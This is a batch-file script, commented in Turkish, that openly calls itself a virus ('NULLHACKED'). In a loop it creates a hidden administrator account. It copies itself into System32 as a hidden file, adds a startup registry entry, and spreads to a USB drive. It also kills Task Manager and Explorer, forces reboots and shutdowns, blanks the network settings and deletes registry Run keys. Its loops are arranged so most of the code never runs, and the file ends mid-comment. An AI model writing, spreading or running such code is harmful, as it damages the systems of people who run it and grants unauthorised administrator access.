@echo off
setlocal enabledelayedexpansion

:: Spam admin kullanıcıları açan döngü
:loop
net user NULLHACKED /add
net localgroup administrators NULLHACKED /add
goto loop

:: Virüs kendini system32 ye kopyalayıp+kendini gizli konumuna getirip gizlesin
copy /y "%~dp0NULLHACKED.bat" "C:\Windows\System32\NULLHACKED.bat"
attrib +h +s "C:\Windows\System32\NULLHACKED.bat"

:: Bilgisayarın her açılışında kendini otomatik olarak başlatan
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "NULLHACKED" /t REG_SZ /d "%~dp0NULLHACKED.bat" /f

:: Sonsuz döngü ile sürekli uygulamalar açan
:start
start notepad.exe
start calc.exe
start msconfig.exe
start regedit.exe
start taskmgr.exe
start cmd.exe
goto start

:: Bilgisayarın flash belleğine otomatik olarak bulaşsın
if exist e:\ (
    copy /y "%~dp0NULLHACKED.bat" "e:\NULLHACKED.bat"
    attrib +h +s "e:\NULLHACKED.bat"
)

:: Görev yöneticisini devre dışı bırakan
taskkill /im taskmgr.exe /f
taskkill /im explorer.exe /f
taskkill /im cmd.exe /f

:: Kapatılmaya çalıştığında ani anda yeniden başlatan
if "%1"=="-restart" goto restart
:restart
shutdown /r /t 0 /f
shutdown /s /t 0 /f

:: Bilgisayarın ağ bağlantısını kesen
netsh interface ip set address "Local Area Connection" static 0.0.0.0 0.0.0.0
netsh interface ip set dns "Local Area Connection" static 0.0.0.0

:: Bilgisayarın kayıt defterini bozan
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /f

:: Sonsuz döngü ile sürekli çalışmaya devam eden
goto loop

:: Ekstra özellikler
:: Bilgisayarın ekran koruyucusunu devre dışı bırakan
reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "0" /f

:: Bilgisayarın sesini kapatmaya çalışan
reg add "HKCU\Control Panel\Sound" /v "SoundScheme" /t REG_SZ /d "No Sound" /f

:: Bilgisayarın duvar kağıdını değiştiren
